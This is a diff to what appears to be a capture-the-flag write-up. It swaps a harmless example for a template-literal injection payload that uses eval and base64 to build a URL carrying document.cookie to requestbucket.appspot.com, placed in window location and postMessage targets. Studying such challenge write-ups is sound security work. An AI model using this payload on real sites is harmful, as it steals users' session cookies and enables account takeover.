@@ -34,18 +34,18 @@ looked something like this after interpolation:
 
 ```
 if (window.top == window.self) {
-    windowhref = "https://aaa`,",atob(`aHR0cDovL2dvb2dsZS5jb20`);(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
+    window.self.location.href = "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
 } else {
     var data = JSON.stringify({
         message: 'CTF.API.remote',
         data: {
-            location: "https://`,",atob(`aHR0cDovL2dvb2dsZS5jb20`);(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
+            location: "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
         }
     });
     window.parent.postMessage(
         data, 
-        "https://bbb`,",atob(`aHR0cDovL2dvb2dsZS5jb20`);(`${`.orange.ctf"
+        "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf"
     );
-} 
+}
 ```
 
